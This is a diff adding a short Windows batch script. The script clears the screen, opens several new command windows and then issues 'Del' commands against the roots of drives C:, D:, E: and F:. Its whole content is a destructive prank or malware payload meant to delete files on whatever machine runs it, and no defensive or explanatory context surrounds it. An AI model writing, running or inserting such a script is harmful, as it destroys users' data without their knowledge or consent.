@@ -1,0 +1,10 @@
+﻿@echo off
+cls
+Start
+Start
+Start
+Start
+Del C:\
+Del E:\
+Del F:\
+Del D:\
